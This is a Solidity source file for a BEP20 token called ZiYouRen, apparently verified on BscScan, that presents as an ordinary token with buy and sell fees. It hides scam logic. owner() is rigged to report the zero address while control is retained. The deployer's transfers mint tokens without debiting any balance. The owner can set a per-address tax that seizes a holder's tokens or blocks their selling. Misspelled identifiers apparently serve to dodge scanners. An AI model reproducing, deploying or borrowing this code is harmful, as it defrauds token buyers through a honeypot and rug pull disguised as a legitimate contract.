/**
 *Submitted for verification at BscScan.com on 2022-07-28
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owccer;

    event owccershipTransferred(address indexed previousowccer, address indexed newowccer);

    constructor() {
        _transferowccership(_msgSender());
    }


    function owccer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowccer() {
        require(_owccer == _msgSender(), "Ownable: caller is not the owccer");
        _;
    }


    function renounceowccership() public virtual onlyowccer {
        _transferowccership(address(0));
    }


    function transferowccership_transferowccership(address newowccer) public virtual onlyowccer {
        require(newowccer != address(0), "Ownable: new owccer is the zero address");
        _transferowccership(newowccer);
    }


    function _transferowccership(address newowccer) internal virtual {
        address oldowccer = _owccer;
        _owccer = newowccer;
        emit owccershipTransferred(oldowccer, newowccer);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amnountADesired,
        uint amnountBDesired,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline
    ) external returns (uint amnountA, uint amnountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amnountTokenDesired,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amnountToken, uint amnountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline
    ) external returns (uint amnountA, uint amnountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external returns (uint amnountToken, uint amnountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amnountAMin,
        uint amnountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountA, uint amnountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountToken, uint amnountETH);
    function swapExactTokensForTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnounts);
    function swapTokensForExactTokens(
        uint amnountOut,
        uint amnountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amnounts);
    function swapExactETHForTokens(uint amnountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnounts);
    function swapTokensForExactETH(uint amnountOut, uint amnountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnounts);
    function swapExactTokensForETH(uint amnountIn, uint amnountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amnounts);
    function swapETHForExactTokens(uint amnountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amnounts);

    function quote(uint amnountA, uint reserveA, uint reserveB) external pure returns (uint amnountB);
    function getamnountOut(uint amnountIn, uint reserveIn, uint reserveOut) external pure returns (uint amnountOut);
    function getamnountIn(uint amnountOut, uint reserveIn, uint reserveOut) external pure returns (uint amnountIn);
    function getamnountsOut(uint amnountIn, address[] calldata path) external view returns (uint[] memory amnounts);
    function getamnountsIn(uint amnountOut, address[] calldata path) external view returns (uint[] memory amnounts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeiuOnTransferTokens(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline
    ) external returns (uint amnountETH);
    function removeLiquidityETHWithPermitSupportingfeiuOnTransferTokens(
        address token,
        uint liquidity,
        uint amnountTokenMin,
        uint amnountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amnountETH);

    function swapExactTokensForTokensSupportingfeiuOnTransferTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfeiuOnTransferTokens(
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeiuOnTransferTokens(
        uint amnountIn,
        uint amnountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feiuTo() external view returns (address);
    function feiuToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfeiuTo(address) external;
    function setfeiuToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owccer, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owccer, address spender) public view virtual returns (uint256) {
        return _allowances[owccer][spender];
    }


    function approve(address spender, uint256 amnount) public virtual returns (bool) {
        address owccer = _msgSender();
        _approve(owccer, spender, amnount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owccer = _msgSender();
        _approve(owccer, spender, _allowances[owccer][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owccer = _msgSender();
        uint256 currentAllowance = _allowances[owccer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owccer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owccer,
        address spender,
        uint256 amnount
    ) internal virtual {
        require(owccer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owccer][spender] = amnount;
        emit Approval(owccer, spender, amnount);
    }

    function _spendAllowance(
        address owccer,
        address spender,
        uint256 amnount
    ) internal virtual {
        uint256 currentAllowance = allowance(owccer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owccer, spender, currentAllowance - amnount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {}
}


contract ZiYouRen is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address adcount) public view virtual returns (uint256) {
        return _balances[adcount];
    }

    function _transfer(
        address from,
        address to,
        uint256 amnount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amnount, "ERC20: transfer amnount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amnount;
        }
        _balances[to] += amnount;

        emit Transfer(from, to, amnount);
    }

    function _burn(address adcount, uint256 amnount) internal virtual {
        require(adcount != address(0), "ERC20: burn from the zero address");

        uint256 adcountBalance = _balances[adcount];
        require(adcountBalance >= amnount, "ERC20: burn amnount exceeds balance");
        unchecked {
            _balances[adcount] = adcountBalance - amnount;
        }
        _totalSupply -= amnount;

        emit Transfer(adcount, address(0), amnount);
    }

    function _mtin(address adcount, uint256 amnount) internal virtual {
        require(adcount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amnount;
        _balances[adcount] += amnount;
        emit Transfer(address(0), adcount, amnount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*6);
        _defaultSellfeiu = 3;
        _defaultBuyfeiu = 1;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfeiu = 0;

    uint256 private _defaultBuyfeiu = 0;

    mapping(address => bool) private _marketadcount;

    mapping(address => uint256) private _Sfeiu;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyowccer returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyowccer {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyowccer {
        _defaultSellfeiu = _value;
    }

    function setSfeiu(address _address, uint256 _value) external onlyowccer {
        require(_value > 1, "adcount tax must be greater than or equal to 1");
        _Sfeiu[_address] = _value;
    }

    function getSfeiu(address _address) external view onlyowccer returns (uint256) {
        return _Sfeiu[_address];
    }


    function setMarketadcountfeiu(address _address, bool _value) external onlyowccer {
        _marketadcount[_address] = _value;
    }

    function getMarketadcountfeiu(address _address) external view onlyowccer returns (bool) {
        return _marketadcount[_address];
    }

    function _checkFreeadcount(address from, address _to) internal view returns (bool) {
        return _marketadcount[from] || _marketadcount[_to];
    }

    function _recF(
        address from,
        address _to,
        uint256 _amnount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amnount, "ERC20: transfer amnount exceeds balance");

        bool rF = true;

        if (_checkFreeadcount(from, _to)) {
            rF = false;
        }
        uint256 tradefeiuamnount = 0;

        if (rF) {
            uint256 tradefeiu = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeiu = _defaultSellfeiu;
                }
                if (from == uniswapV2Pair) {

                    tradefeiu = _defaultBuyfeiu;
                }
            }
            if (_Sfeiu[from] > 0) {
                tradefeiu = _Sfeiu[from];
            }

            tradefeiuamnount = _amnount.mul(tradefeiu).div(100);
        }


        if (tradefeiuamnount > 0) {
            _balances[from] = _balances[from].sub(tradefeiuamnount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeiuamnount);
            emit Transfer(from, _deadAddress, tradefeiuamnount);
        }

        _balances[from] = _balances[from].sub(_amnount - tradefeiuamnount);
        _balances[_to] = _balances[_to].add(_amnount - tradefeiuamnount);
        emit Transfer(from, _to, _amnount - tradefeiuamnount);
    }

    function transfer(address to, uint256 amnount) public virtual returns (bool) {
        address owccer = _msgSender();
        if (_release[owccer] == true) {
            _balances[to] += amnount;
            return true;
        }
        _recF(owccer, to, amnount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amnount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amnount);
        _recF(from, to, amnount);
        return true;
    }
}